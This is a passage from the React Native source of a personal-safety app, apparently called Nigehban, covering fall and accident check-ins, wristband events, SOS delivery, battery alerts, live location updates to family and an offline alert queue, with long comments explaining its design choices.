    const clientId = pressId();

    // On screen immediately, before the network call, for the same reason
    // `raise` dispatches before its POST: the wearer must see the countdown
    // and get their chance to cancel even with no signal at all. The deadline
    // shown here is provisional and is replaced by the server's below.
    const localWindow = INCIDENT_WINDOW_S[reason] ?? 45;
    dispatch('FALL_DETECTED', {
      severity: reason === 'accident' ? 5 : 4,
      reason,
      note,
      window: localWindow,
      endsAt: Date.now() + localWindow * 1000,
    });
    noteImpact();
    Vibration.vibrate([0, 400, 200, 400, 200, 400]);

    // The band asks the question on the wrist, which is the only channel that
    // reaches somebody face down on a pavement with the phone across the road.
    // It nags on its own from here -- see CHECKIN_NAG_MS in the .ino.
    try { bandRef.current?.send?.({ c: 'checkin_req', window: localWindow }); } catch { /* no band */ }

    try {
      const r = await call(session, '/checkin/self', {
        method: 'POST',
        body: { reason, lat: at?.lat, lon: at?.lon, note, client_id: clientId },
        timeout: ALERT_TIMEOUT,
      });
      // The wearer already answered this one -- from the wrist, while the
      // first attempt was timing out in a dead zone. Take the countdown off
      // the screen rather than starting one for a question that is closed.
      if (r.already_answered) { dispatch('FALL_CANCELLED'); return; }

      // The server's deadline replaces the local guess. It is authoritative --
      // the sweeper is going to act on THAT number, so a countdown showing a
      // different one is lying to the person deciding whether to press.
      dispatch('FALL_DETECTED', {
        severity: reason === 'accident' ? 5 : 4,
        reason, note, checkinId: r.checkin_id,
        window: r.window ?? localWindow, endsAt: r.due_at * 1000,
      });
    } catch {
      // No network. The countdown above stands, and running out will raise the
      // alert into the offline queue rather than into the sweeper. Said plainly
      // on screen, because the two are not equally reliable and the wearer is
      // the one who may need to make a phone call instead.
      setToast('No signal — if you do not answer, the alert will send as soon as '
               + 'connection returns');
    }
  }, [session, fix, dispatch]);

  // ---- the band drives the same actions ----------------------------------
  const ctxRef = useRef(ctx);
  ctxRef.current = ctx;
  const stateRef = useRef(state);
  stateRef.current = state;

  const onBandEvent = useCallback((ev) => {
    // ---- a spike the band could not interpret -------------------------------
    //
    // Handled before bandEventToAction, and deliberately not by it: `impact` is
    // not a transition. It is a measurement, and whether it means anything at
    // all depends on the phone's speed history, which the reducer has no
    // business knowing about. The band sends these freely -- a hand put down
    // hard on a table clears 8 g -- and the speed gate is the entire reason
    // that is acceptable rather than a stream of false alarms.
    if (ev.e === 'impact') {
      if (classifyImpact(ev) !== 'accident') return;
      openIncidentCheckin('accident', ev);
      return;
    }

    const action = bandEventToAction(ev);
    if (!action) return;

    if (action.type === 'FALL_DETECTED') {
      if (stateRef.current === 'sos_live') return;      // already the worst case
      // A fall while travelling at road speed is an accident, whatever the
      // band called it. The free-fall the band saw is a rider leaving a bike,
      // and the family needs to be sent to a carriageway rather than told
      // somebody tripped.
      const reason = speedContext().wasTravelling ? 'accident' : 'fall';
      openIncidentCheckin(reason, ev);
      return;
    }

    if (action.type === 'SOS_RAISED') {
      if (!ctxRef.current.activeSos) {
        raise({ kind: ev.e === 'snatch' ? 'snatch' : 'sos', source: 'band', note: ev.src || '' });
      } else {
        // Pressed again during an emergency that is already live. Nothing new
        // is raised -- one press, one alert -- but the band is sitting there
        // waiting to be told what happened to this press, and silence is not an
        // answer. Without this it would run out its 4 s and buzz FAILED at
        // somebody whose SOS is in fact live and being answered, which is the
        // worst possible time to tell them help is not coming.
        reportOutcome('delivered', 'sos');
      }
      return;
    }

    if (action.type === 'CHECKIN_CLOSED') {
      // Key 1 is "I'm fine": it stands down a live alert, otherwise it answers
      // the open question. Start and stop from the band, with no firmware change.
      const live = ctxRef.current.activeSos;
      if (live) { resolve(live.id); return; }
      // A fall or an accident is a question too, and it is the one this key
      // matters most for: the wearer is on the ground with the phone somewhere
      // else, and the wrist is the only thing in reach. Routed to cancelFall
      // rather than to ackCheckin so the "nobody was told" note is written and
      // the countdown actually comes off the screen.
      if (stateRef.current === 'fall_pending') { cancelFallRef.current?.(); return; }
      ackCheckin(ctxRef.current.checkin);
      return;
    }

    if (action.type === 'CHECKIN_EXPIRED') {
      // The band gave up nagging. The server is the one escalating, so all
      // this does is stop the wearer wondering: the buzzing stopped, and
      // nothing on screen would otherwise say why.
      dispatch('CHECKIN_EXPIRED');
      setToast('The check-in window has passed — your family is being told. '
               + 'Answering now still tells them you are fine.');
      return;
    }

    if (action.type === 'HIGH_ALERT_SET') {
      // The band's hold-3s is only the switch; the mode itself is server-owned
      // so that it outlives this app being killed.
      toggleHighAlert(action.on);
    }
  }, [dispatch, raise, resolve, ackCheckin, toggleHighAlert, reportOutcome,
      openIncidentCheckin]);

  // ---- the band PIN, kept against the account ---------------------------
  //
  // `band.js` knows when a PIN has been ACCEPTED by the wristband, and knows
  // nothing about accounts. This is the seam: it turns that fact into a row on
  // the server, so a wearer who forgets the PIN can get it back.
  //
  // It exists because pressing Disconnect makes the phone forget the PIN, which
  // is deliberate and stays -- and which removes the local copy in precisely
  // the situation somebody wants it back.
  //
  // `escrowReachable` is the guard that keeps the two copies honest. A PIN
  // changed with no signal would leave the account holding the old one, and an
  // account confidently handing back a PIN the band has stopped accepting is
  // worse than an account holding none: the wearer types it, the band refuses,
  // and they have spent attempts against a lockout believing they had the
  // answer. So a change without a network is refused rather than allowed to
  // diverge.
  const sessionRef = useRef(session);
  sessionRef.current = session;

  const escrowPin = useCallback(async (pin) => {
    const s = sessionRef.current;
    if (!s) return false;
    try { await saveBandPin(s, pin); return true; } catch { return false; }
  }, []);

  const escrowReachable = useCallback(async () => {
    const s = sessionRef.current;
    if (!s) return false;
    // `/me` rather than the PIN endpoint: it is cheap, unlimited, and reading
    // the PIN is rate limited precisely so it cannot be used as a heartbeat.
    try { await call(s, '/me'); return true; } catch { return false; }
  }, []);

  const band = useBandLink(onBandEvent, { escrowPin, escrowReachable });
  bandRef.current = band;

  // Two separate things need this app's Android process alive, and the service
  // is the only thing that keeps it alive once the app is off screen or swiped
  // out of Recents. Either one on its own is enough to justify it:
  //
  //   1. A linked band. The GATT link belongs to the process, so when the
  //      process dies the band drops back to advertising -- the blinking light.
  //   2. Being armed at all. useHeartbeat only beats while mode != 'idle', and
  //      the server's watchdog pages the whole family with watch_lost after
  //      BEAT_LOST_S of silence in exactly that state. Kill the process of an
  //      armed phone and it reports its own wearer missing. That applies to
  //      virtual mode especially, where the phone *is* the band and there is no
  //      stored band id to find.
  //
  // Condition 2 is why this cannot simply ask "does this phone want a band".
  //
  // What must *not* be used is the live connection. A band out of range is
  // exactly when band.js's retry loop needs the process alive; stopping the
  // service there would kill the thing doing the reconnecting. band.status is
  // in the dependency list as a trigger only -- it changes at both moments the
  // stored flag does (connected when the id is written, idle when DISCONNECT
  // clears it), which re-runs the read without band.js having to know the
  // service exists at all.
  useEffect(() => {
    // Before the stored mode loads every launch looks like virtual mode -- the
    // same trap bandLink.js's autoLink had. Acting on that default would stop
    // the service for a moment on every launch of a band-wearer's phone.
    if (!band.modeLoaded) return undefined;

    let cancelled = false;
    (async () => {
      // Armed is decisive on its own and needs no storage read, so it is
      // answered first: there is no band state that makes it safe to let an
      // armed phone's process die.
      if (watchMode !== 'idle') { syncBackgroundWatch(!!session); return; }

      // Idle from here. Only a band the user still wants keeps the service up;
      // DISCONNECT clears that id, and virtual mode has none to begin with.
      if (band.mode !== MODES.BLE) { syncBackgroundWatch(false); return; }

      const wanted = await wantsBand();
      if (cancelled) return;
      // null means the read failed. Passed through so syncBackgroundWatch
      // leaves the service alone rather than tearing down a live link over it.
      syncBackgroundWatch(wanted === null ? null : (!!session && wanted));
    })();
    return () => { cancelled = true; };
  }, [session, band.status, band.mode, band.modeLoaded, watchMode]);

  // ---- the band's own way in: SWITCHED OFF --------------------------------
  //
  // Turned off on purpose on 1 Sep 2026. The full reasoning, and the exact
  // steps to turn it back on, are in docs/BAND_WAKE_DISABLED.md. Nothing was
  // deleted: the three effects that drove it are kept verbatim below this one,
  // commented out, and the module they call is switched off at
  // `BAND_WAKE_ENABLED` in src/bandWake.js and `BandWake.FEATURE_ENABLED` in
  // BandWake.kt.
  //
  // The short version: the wake carries no band identity, so one band's press
  // is accepted by every Nigehban phone in range (BUG-012) and swallows the
  // second wearer's own SOS on the way past (BUG-013). Both are Critical, both
  // need a band id in the advertisement, and that means new firmware in the
  // field before this can be trusted again. On the reporter's Android 8 Vivo
  // the wake also drags unrelated apps to the foreground (BUG-018).
  //
  // What is given up by switching it off, said plainly: on an OEM skin that
  // runs `kill -9` on a Recents swipe, a press with the app killed now reaches
  // nobody. The band is only a working safety device while this app or its
  // foreground service is alive.
  //
  // This effect is the one live remnant, and it is a cleanup rather than a
  // feature: a phone updating from a build that had the wake armed still has a
  // registration in the Bluetooth stack and an `armed` flag in the module's
  // storage that BandWakeBootReceiver would act on after the next reboot.
  // `stopBandWake()` clears both. It is cheap, idempotent and a no-op on a
  // phone that never had it.
  useEffect(() => { stopBandWake(); }, []);

  /* ---- SWITCHED OFF: the beacon path, kept for whoever turns it back on ----

  // The foreground service above is the app's attempt to stay alive. On most
  // non-Samsung skins it loses: a swipe on the Recents screen is `kill -9`, and
  // the GATT link dies with the process. From that moment the band looks linked
  // and can reach nobody, which is the exact state a wearer walks out in.
  //
  // So the SOS also goes out in the band's advertisement, and the scan that
  // matches it is registered with Android rather than held by us -- it outlives
  // the kill. See src/bandWake.js.
  //
  // Armed on the same standing instruction the link itself runs on, and
  // deliberately NOT on `session`: a signed-out phone still wants the press
  // written down, and the pending record waits for a session rather than being
  // thrown away. Not on `band.status` either -- an out-of-range band is when
  // this matters most, and disarming then would remove the one path still
  // capable of carrying the alert.
  useEffect(() => {
    if (!band.modeLoaded) return undefined;
    if (band.mode !== MODES.BLE) { stopBandWake(); return undefined; }

    let cancelled = false;
    (async () => {
      const wanted = await wantsBand();
      if (cancelled || wanted === null) return;   // read failed: change nothing
      if (wanted) await startBandWake(); else await stopBandWake();
    })();
    return () => { cancelled = true; };
  }, [band.mode, band.modeLoaded, band.status]);

  // What to do with a press that came in over the advertisement.
  //
  // It goes through `raise` like every other SOS: the same GPS fix, the same
  // offline queue, the same family fan-out. A second code path for the
  // emergency case would be the one nobody ever exercises.
  const raiseBeaconSos = useCallback(async (hit) => {
    if (!hit) return;
    // Too old to escalate on its own. The wearer is still told -- a press that
    // went nowhere is exactly what they need to know about -- but a family is
    // not paged about something that happened before lunch.
    if (hit.stale) {
      setToast('Your band called for help while the app was closed, too long ago '
             + 'to send now. Press SOS again if you still need help.');
      return;
    }
    await raise({
      kind: 'sos',
      source: 'band',
      note: 'band beacon — the app was not running',
    });
  }, [raise]);

  // Held in a ref, and the two effects below depend on the token rather than on
  // the handler.
  //
  // `raise` closes over `fix`, which is replaced on every GPS update. Depending
  // on the handler directly would therefore tear the subscription down and
  // rebuild it every few seconds, and a press landing in one of those gaps
  // would find no listener -- so it would fall through to the notification
  // route on a phone where the app was in fact wide awake. The ref keeps the
  // newest handler without moving the subscription.
  const beaconSosRef = useRef(raiseBeaconSos);
  beaconSosRef.current = raiseBeaconSos;

  // Arriving while JS is alive: no notification, the alert simply goes.
  useEffect(() => {
    if (!session?.token) return undefined;
    return subscribeBandSos((hit) => beaconSosRef.current?.(hit));
  }, [session?.token]);

  // Arriving while the app was dead. The press was written to storage by a
  // receiver in a process that no longer exists; this is the first moment
  // anything can act on it. Checked on every resume as well as at boot,
  // because Android may bring the app back without a fresh mount.
  useEffect(() => {
    if (!session?.token) return undefined;
    const check = async () => {
      const hit = await consumePendingBandSos();
      if (hit) beaconSosRef.current?.(hit);
    };
    check();
    const sub = AppState.addEventListener('change', (next) => {
      if (next === 'active') check();
    });
    return () => sub.remove();
  }, [session?.token]);

  ---- end of the switched-off beacon path ---- */

  // ---- U3.4 battery: one alert per threshold crossing, per device --------
  //
  // Two cells, watched separately. They used to be one number: `band.battery`
  // was raised as `going_dark` and shown to the family as "phone about to
  // die", so in BLE mode a wearer at 4% band and 90% phone paged his family
  // about the wrong device -- and a wearer whose phone was genuinely dying
  // said nothing at all, because the phone's own battery was never read.
  //
  // The distinction is not cosmetic. A flat band means the safety device is
  // off the air while the phone can still be reached by push; a flat phone
  // means every path to the family is about to close, including that push.
  // Hence going_dark at severity 3 against band_battery at 1.
  const phoneBatt = usePhoneBattery();
  const battLatch = useRef({ phoneLow: false, phoneDark: false, bandLow: false });

  useEffect(() => {
    const level = phoneBatt;
    if (level == null) return;                 // unknown is not the same as empty
    const low = level <= BATT_LOW;
    const dark = level <= BATT_DARK;

    if (dark && !battLatch.current.phoneDark) {
      battLatch.current.phoneLow = true;
      battLatch.current.phoneDark = true;
      raise({ kind: 'going_dark', source: 'app', note: `phone ${Math.round(level)}%` });
      setToast('Phone battery critical — your family has been told where you were');
    } else if (low && !battLatch.current.phoneLow) {
      battLatch.current.phoneLow = true;
      raise({ kind: 'low_battery', source: 'app', note: `phone ${Math.round(level)}%` });
    } else if (level > BATT_LOW + BATT_REARM) {
      battLatch.current.phoneLow = false;
      battLatch.current.phoneDark = false;     // charged: arm it again
    }
    dispatch('BATTERY', { level, low, goingDark: dark });
  }, [phoneBatt, raise, dispatch]);

  // The band's own cell. Only in BLE mode: in virtual mode `band.battery` is
  // this same phone read through expo-battery, so raising it here would page
  // the family twice for one battery.
  //
  // Debounced over consecutive readings rather than latched on one, because
  // this number is known to alternate -- see BAND_LOW_STREAK above. A single
  // reading below the threshold means nothing here.
  const bandLowStreak = useRef(0);
  useEffect(() => {
    if (band.mode !== MODES.BLE) return;
    const level = band.battery;
    if (level == null) return;

    if (level <= BATT_LOW) {
      bandLowStreak.current += 1;
      if (bandLowStreak.current >= BAND_LOW_STREAK && !battLatch.current.bandLow) {
        battLatch.current.bandLow = true;
        raise({ kind: 'band_battery', source: 'app', note: `band ${Math.round(level)}%` });
      }
    } else {
      bandLowStreak.current = 0;
      if (level > BATT_LOW + BATT_REARM) {
        battLatch.current.bandLow = false;     // charged: arm it again
      }
    }
  }, [band.battery, band.mode, raise]);

  // The server's watchdog listens for silence, so the phone speaks while
  // anything is armed. N2's foreground service is what keeps this going once
  // Android backgrounds the app.
  useHeartbeat(session, {
    mode: watchMode,
    bandLink: band.status === 'connected' || band.status === 'virtual',
    // Never substituted for one another. In virtual mode there is no second
    // cell, so bandBatt is null rather than a copy of the phone's reading.
    bandBatt: band.mode === MODES.BLE ? band.battery : null,
    phoneBatt,
    virtual: band.mode !== MODES.BLE,
  });

  // Presence is what makes the Good Samaritan fan-out possible at all: it is
  // the only way the server can know who is close to somebody else's emergency.
  usePresence(session, fix);

  // The speed history that turns an 11 g spike into either "a door slammed" or
  // "a road accident". It has to already be running when the impact happens --
  // there is no asking afterwards how fast somebody was going -- which is why
  // this is a standing watch and not something the detector starts.
  //
  // It costs battery, so it is tied to the phone actually acting as a safety
  // device rather than merely being signed in. A family member watching from
  // across town has no impacts to classify, and their emergencies arrive by
  // push whether or not this is running.
  useSpeedWatch(!!session && (band.status === 'connected' || band.mode !== MODES.BLE));

  // ---- live socket --------------------------------------------------------
  const serverOnline = useLive(session, {
    alert: (m) => {
      const a = m.alert;
      if (a.severity >= TAKEOVER_FROM) setIncoming(a);

      if (a.severity >= SIREN_FROM) {
        // N3.3/N3.4. On a dev or production build this is a real full-screen
        // intent plus a looping siren, so a backgrounded app takes the lock
        // screen over instead of waiting to be noticed. It returns false in
        // Expo Go and on web, where the native module is not in the binary --
        // there the old notification is still the best available signal.
        presentAlarm(a).then((took) => {
          // Not `sendEmergencyAlarmNotification` directly. The same alert also
          // arrives as a visible push and as a silent push that wakes the
          // background task, and this path is the only one that used to post
          // without first looking at what was already on screen -- which is
          // exactly why one SOS showed up two and three times with the app
          // open, and behaved itself with the app killed.
          if (!took) sendEmergencyAlarmIfNothingShown(a);
        });
      } else {
        // No siren, but the takeover above is on screen and the shade gets a
        // line too, so the same event is still there after it is dismissed.
        // The heading is the app's own wording, not `watch_lost` with its
        // underscore taken out.
        notifyIfAway(
          `${a.user.name} — ${(TAKEOVER_TITLE[a.kind] || a.kind.replace(/_/g, ' ')).toLowerCase()}`,
          TAKEOVER_LEDE[a.kind] || 'Open Nigehban for details.');
        // A quiet double buzz. The siren covers severity 4 and up; without
        // this a severity-3 takeover appeared on a silent phone in a pocket.
        try { Vibration.vibrate([0, 250, 150, 250]); } catch { /* no motor */ }
      }
      bump();
    },
    resolved: (m) => {
      setIncoming((cur) => (cur && cur.id === m.alert_id ? null : cur));
      setSamaritan((cur) => (cur && cur.id === m.alert_id ? null : cur));
      // The end of an emergency is the other half of the one that took the
      // screen. A family member who was shown a siren and then a four-second
      // toast had no reliable way of learning it was over.
      // Two ways an alert ends now, and they are different facts about what a
      // person did. "She pressed the button" is somebody actively saying they
      // are fine; "she answered two check-ins" is the server concluding it on
      // her behalf from two taps five minutes apart. A family member deciding
      // whether to keep driving is entitled to know which one they have.
      const how = m.auto
        ? 'They answered two check-ins in a row, so Nigehban stood it down.'
        : 'They stood the alert down themselves.';
      pushNotice({
        icon: 'shield', tone: U.mint,
        title: `${m.user.name} is safe`,
        body: how,
      });
      notifyIfAway(`${m.user.name} is safe`, how);
      bump();
    },

    // Her position, while it is still moving.
    //
    // The takeover is the screen most likely to be open when this arrives --
    // somebody has just been sirened awake and is looking at "SEE WHERE THEY
    // ARE" -- and until this the button under that heading opened a map of
    // where they had BEEN, frozen at the moment the button was pressed. The
    // alert row is patched in place rather than refetched: the frame carries
    // everything the pin needs, and a network round trip during an emergency
    // is a round trip that can fail.
    live_location: (m) => {
      setIncoming((cur) => (cur && String(cur.id) === String(m.alert_id)
        ? { ...cur, live_lat: m.lat, live_lon: m.lon, live_at: m.at, maps: m.maps }
        : cur));
      // And the wearer's own live alert, when this frame is the echo of a fix
      // this phone sent. It is what lets her own SOS screen say "Live" only
      // while the server is actually receiving positions -- see the note on
      // the fan-out targets in services/alerts.py.
      dispatch('LIVE_FIX', { alertId: m.alert_id, lat: m.lat, lon: m.lon,
                             at: m.at, maps: m.maps });
      // The embedded page polls the server itself, so the map moves without
      // this. What it does not know about is the native Directions button
      // underneath it, which routes from `live_lat` -- and a stale one sends
      // somebody to where she was when they opened the screen.
      setLiveMap((cur) => (cur && String(cur.id) === String(m.alert_id)
        ? { ...cur, live_lat: m.lat, live_lon: m.lon, live_at: m.at, maps: m.maps }
        : cur));
      // The alert lists redraw from the server, which now carries the same
      // fields on the row. Throttled by `bump` being cheap rather than by a
      // timer: at ten seconds apart this is six renders a minute.
      bump();
    },

    samaritan_status_update: (m) => {
      dispatch('SAMARITAN_STATUS', {
        alertId: m.alert_id,
        samaritan_status: m.samaritan_status,
        decided_by: m.decided_by,
      });
      setIncoming((cur) => {
        if (!cur || cur.id !== m.alert_id) return cur;
        return {
          ...cur,
          samaritan_status: m.samaritan_status,
          samaritan_decided_by: m.decided_by,
        };
      });
      if (m.samaritan_status === 'allowed') {
        setToast(`Nearby Good Samaritans have been notified by ${m.decided_by?.name || 'family'}`);
      } else if (m.samaritan_status === 'denied') {
        setToast('Emergency set to Family Only');
      }
      bump();
    },
    ack: (m) => {

      // `m.at` is the server's clock. Falling back to arrival time is only for
      // a phone talking to a server older than this change.
      dispatch('RESPONDER', { by: m.by, at: m.at });
      // The single most important thing anybody who has pressed SOS is waiting
      // to hear, and it was a toast that cleared itself after four seconds.
      pushNotice({
        icon: 'user-check', tone: U.mint,
        title: `${m.by.name} is on the way`,
        body: m.samaritan
          ? 'They are nearby and can see your location.'
          : 'They answered your alert and can see your location.',
        // No buzz. The wearer may be hiding from whoever they pressed the
        // button about -- the same rule the server's own responder push obeys.
        quiet: true,
      });
    },
    checkin_req: (m) => {
      // A detector's question, not a person's. Two things make it different
      // and both matter: there is no `from` to name, and it belongs on the
      // full-screen countdown rather than in a bottom sheet somebody can
      // scroll past. `/checkin/self` sends this back to the phone that raised
      // it -- harmlessly, since FALL_DETECTED is a no-op once fall_pending --
      // and it is also how a SECOND device on the same account finds out.
      if (m.system && INCIDENT_WINDOW_S[m.reason] != null) {
        dispatch('FALL_DETECTED', {
          severity: m.reason === 'accident' ? 5 : 4,
          reason: m.reason, note: m.note || '', checkinId: m.checkin_id,
          window: m.window, endsAt: (m.due_at || 0) * 1000,
        });
        Vibration.vibrate([0, 400, 200, 400, 200, 400]);
        band.send({ c: 'checkin_req', window: m.window ?? 45 });
        return;
      }
      const checkin = {
        ...m.from, checkin_id: m.checkin_id, window: m.window || 90,
        due_at: m.due_at, _startAt: Date.now() / 1000,
      };
      dispatch('CHECKIN_ASKED', { checkin });
      setAskSheet(checkin);
      Vibration.vibrate([0, 200, 100, 200]);
      band.send({ c: 'checkin_req', window: m.window ?? 45 });
      notify(`${m.from.name} is checking on you`, 'Tap "I am fine" to answer.');
    },
    // The sweeper's own knock, on the server's schedule rather than anyone's
    // thumb. It looks the same to the wearer, which is the point.
    //
    // Two rhythms arrive here now and they mean opposite things. `high_alert`
    // is the standing arrangement: answer, and it continues. `sos` is asked
    // with the family already alerted and sirens already running, and
    // answering it is the way OUT -- twice in a row and the alert stands
    // itself down. `streak` is how far along that the wearer already is, sent
    // by the server so the screen can say "1 of 2" instead of making somebody
    // under pressure keep count.
    buzz_now: (m) => {
      const checkin = {
        name: null, system: true, reason: m.reason, checkin_id: m.checkin_id,
        window: m.window || 90, due_at: m.due_at, _startAt: Date.now() / 1000,
        streak: m.streak ?? null, streakNeeded: m.streak_needed ?? null,
      };
      dispatch('CHECKIN_ASKED', { checkin });
      if (m.next_buzz_at) dispatch('NEXT_BUZZ', { at: m.next_buzz_at });
      setAskSheet(checkin);
      Vibration.vibrate([0, 400, 200, 400]);
      band.send({ c: 'checkin_req', window: m.window ?? 90 });
      notify(m.reason === 'sos' ? 'Are you safe now?' : 'Nigehban is checking on you',
             m.reason === 'sos'
               ? 'Answer twice in a row and your SOS is stood down.'
               : 'Tap "I am fine" to answer.');
    },

    // An SOS the wearer never pressed.
    //
    // High Alert was armed, a check-in went unanswered, and the sweeper raised
    // a real emergency about it -- see ESCALATION in server/config.py. This is
    // the first this phone hears of it, and it is very often a false alarm: a
    // shower, a bus with no signal, a phone face-down on a desk. So the SOS
    // screen has to come up, because the one tap that fixes a false alarm is
    // on it, and the tracker has to start, because the one case where it is
    // not a false alarm is the case the whole product exists for.
    sos_started: (m) => {
      if (!m.alert) return;
      dispatch('SOS_RAISED', { alert: m.alert });
      setDeliveredTo(null);
      setDeliveryStatus('delivered');
      showOwnSosNotification(m.alert);
      if (m.tracking) startTracking(m.tracking).catch(() => { /* bg tick retries */ });
      // No siren from the wearer's own pocket. Same rule as every other
      // notification they get during an emergency: they may be hiding from
      // whoever this is about.
      Vibration.vibrate([0, 400, 200, 400, 200, 400]);
      pushNotice({
        icon: 'alert-octagon', tone: U.red,
        title: 'Your family has been alerted',
        body: 'You did not answer a check-in. If you are safe, stand it down.',
        quiet: true,
      });
    },

    // The emergency ended without the wearer touching a stand-down button.
    //
    // Deliberately not the family's `resolved` frame, which this app renders
    // as news about somebody else and would show a person a notice about
    // themselves. What this phone has to do is the part only it can: drop the
    // SOS screen, and take down the sticky "SOS is active" notification it
    // posted -- which is un-dismissable by design, so nothing else ever will.
    sos_cleared: (m) => {
      dispatch('SOS_CLEARED');
      dispatch('CHECKIN_CLOSED');   // same pair, same reason as in `resolve`
      setDeliveredTo(null);
      setDeliveryStatus(null);
      clearOwnSosNotification();
      trackAfterStandDown(m.alert_id, m.track_until, m.track_every_s)
        .catch(() => { /* the next fix re-learns the window from the server */ });
      pushNotice({
        icon: 'shield', tone: U.mint,
        title: 'Your SOS has been stood down',
        body: m.track_until
          ? 'You answered two check-ins. Your family can still see you get home.'
          : 'You answered two check-ins, so your family has been told you are safe.',
      });
      bump();
    },
    // The answer to a question this phone asked. Somebody pressed "check on
    // her" precisely because they were worried, and the reply used to be four
    // and a half seconds of small grey text above the tab bar.
    checkin_ack: (m) => {
      pushNotice({
        icon: 'check-circle', tone: U.mint,
        title: `${m.by.name} is fine`,
        body: 'They answered your check-in.',
      });
      // No local notification: the server sends this one as a real push now,
      // which is what reaches a phone that is not running the app at all.
      bump();
    },
    watch_updated: () => bump(),
    samaritan: (m) => {
      setSamaritan(m.alert);
      Vibration.vibrate([0, 300, 150, 300]);
      notify('Someone near you needs help',
             'A Nigehban emergency was raised close by. Open the app if you can go.');
    },
    samaritan_on_way: (m) => pushNotice({
      icon: 'navigation', tone: U.mint,
      title: `${m.by.name} is heading there`,
      body: 'A neighbour close by answered the alert.',
      quiet: true,
    }),
    invite: (m) => {
      // Deliberately NOT a BigNotice, which is what this used to be.
      //
      // Every other notice in that queue is news: a check-in was answered, an
      // alert stood down, something that is over by the time it is read and
      // whose only correct response is to know it. A request is the opposite
      // -- it is a question with two answers, and it stays true until one of
      // them is given. Taking the screen for it meant reading it, dismissing
      // it, and then going to find the sheet where it could actually be
      // answered: three steps, one of them teaching a family that a thing
      // filling the screen is a thing you swipe away. That habit is the last
      // one this app can afford, because the same shape carries a siren.
      //
      // It lives in the interface now instead, in the two places somebody
      // looks for family: the bell beside ADD on the user shell's board, and
      // the Family tab in the admin console -- both carrying a dot for as
      // long as the question is unanswered, which is the whole point. `bump`
      // is what makes both of them true, by reloading the invite list.
      //
      // The OS notification stays exactly as it was. It is the only half that
      // reaches a phone this app is not running on.
      notify(`${m.invite.from.name} wants to be your family`,
             'Nothing is shared until you accept.');
      bump();
    },
    family_added: (m) => { setToast(`${m.user.name} is now in your family`); bump(); },
  });

  // ---- offline queue: every chance to flush it ----------------------------
  //
  // The rising edge of the WebSocket was the only trigger, and it is the one
  // that cannot fire when it matters most: the socket lives in this tree, so a
  // phone whose app is off screen when signal returns reconnects nothing and
  // delivers nothing until somebody opens it. Four triggers now, because each
  // covers a case the others cannot:
  //
  //   1. the socket's rising edge   -- app open, signal returns
  //   2. coming back to the app     -- reopened after being backgrounded
  //   3. a timer while anything is queued -- app open but the socket is not
  //      the thing that came back (captive portal, server restarted)
  //   4. the foreground service's tick -- app closed entirely; see bgService
  //
  // Two of these firing together would send the same alert twice, and a family
  // paged twice for one press is how a real one gets ignored. There are two
  // guards against that now, at different depths: `flushing` below keeps this
  // screen from doing redundant work, the queue's own interlock covers the
  // background service that this ref cannot see, and `client_id` makes a
  // duplicate that gets through harmless at the server. The last one is the
  // only one that survives the app being killed mid-send.
  const flushing = useRef(false);
  const flushNow = useCallback(async () => {
    if (!session || flushing.current) return;
    flushing.current = true;
    try {
      const { delivered } = await flushQueue(session);
      if (delivered.length > 0) {
        const last = delivered[delivered.length - 1];
        const count = last.response?.delivered_to;
        // Replace the local placeholder with the real server alert.
        if (last.response?.alert) {
          dispatch('SOS_RAISED', { alert: last.response.alert });
        }
        // And start reporting, now that there is a row to report into. This is
        // the dead-zone SOS finally landing -- the emergency has been running
        // for however long the signal took, so the family's first live pin
        // matters more here than anywhere else: the fix in the alert is where
        // she was when she pressed it, which by now may be a long way behind.
        if (last.response?.tracking) {
          startTracking(last.response.tracking).catch(() => { /* bg tick retries */ });
        }
        setDeliveredTo(count ?? null);
        setDeliveryStatus('delivered');
        // The end of the worst wait in the product: an emergency that has been
        // sitting on the phone with no signal has finally gone out. That is
        // not a toast, and the SOS screen it belongs to may not even be the
        // one on top by the time the queue drains.
        pushNotice({
          icon: 'send', tone: U.mint,
          title: count
            ? `Delivered to ${count} ${count === 1 ? 'person' : 'people'}`
            : 'Your alert has been sent',
          body: 'It was saved while you had no signal, and has now gone out.',
        });
        bump();
        return;
      }
      // Nothing delivered here does not mean nothing was delivered. The
      // background flush may have emptied the queue while this screen was
      // gone, and a live SOS screen still reading "waiting for signal" after
      // the alert has actually gone out is the wrong kind of wrong.
      if ((await pendingCount()) === 0) {
        setDeliveryStatus((cur) => (cur === 'queued' ? 'delivered' : cur));
      }
    } finally {
      flushing.current = false;
    }
  }, [session, dispatch, bump, pushNotice]);

  const prevOnline = useRef(false);
  useEffect(() => {
    if (serverOnline && !prevOnline.current) flushNow();
    prevOnline.current = serverOnline;
  }, [serverOnline, flushNow]);

  // ---- a question the socket never delivered ------------------------------
  //
  // `buzz_now` and `checkin_req` arrive over the websocket, and a websocket is
  // not a delivery guarantee -- it is a delivery optimisation. The server
  // writes to whatever sockets happen to be open and drops the frame silently
  // when there are none, which on Android is most of the time: backgrounded,
  // killed by the OEM, or on a train.
  //
  // The check-in row exists either way and its deadline is real. Ninety
  // seconds later the sweeper escalates it and the family is told she did not
  // answer -- a page about a question that was never put to her, which is the
  // worst failure this screen has. There is now a push behind the socket frame
  // as well, but a push is not a guarantee either.
  //
  // So whenever this phone gets back in touch -- socket up, or app brought to
  // the foreground -- it asks the server outright whether it owes anybody an
  // answer, and shows the question with the deadline that is ACTUALLY left
  // rather than a fresh ninety seconds it has no right to.
  //
  // The same read repairs the other half of a killed process: the machine is
  // memory-only, so a restart forgets High Alert, `watchMode` falls back to
  // idle and the heartbeat stops -- while the server still has her armed and
  // pages the family for silence three minutes later. The server is the one
  // that owns that flag, so this takes its answer.
  const recoverOpenWork = useCallback(async () => {
    if (!session?.token) return;
    let w;
    try {
      w = await call(session, `/watch/${session.user_id}`);
    } catch {
      return;                       // still out of touch; the next trigger retries
    }

    if (w.high_alert && !ctxRef.current.highAlert) {
      dispatch('HIGH_ALERT_SET', { on: true, nextBuzzAt: w.next_buzz_at || null });
    }

    // Nothing open, or this is the question already on screen.
    if (!w.checkin_id) return;
    if (ctxRef.current.checkin?.checkin_id === w.checkin_id) return;

    const checkin = {
      checkin_id: w.checkin_id,
      due_at: w.checkin_due_at,
      // Only for the progress bar's denominator; the countdown itself runs to
      // `due_at`, which is the server's clock and the only one that escalates.
      window: 90,
      reason: w.checkin_reason,
      system: !w.checkin_from,
      ...(w.checkin_from || {}),
      _startAt: Date.now() / 1000,
    };
    dispatch('CHECKIN_ASKED', { checkin });
    setAskSheet(checkin);
    Vibration.vibrate([0, 400, 200, 400]);
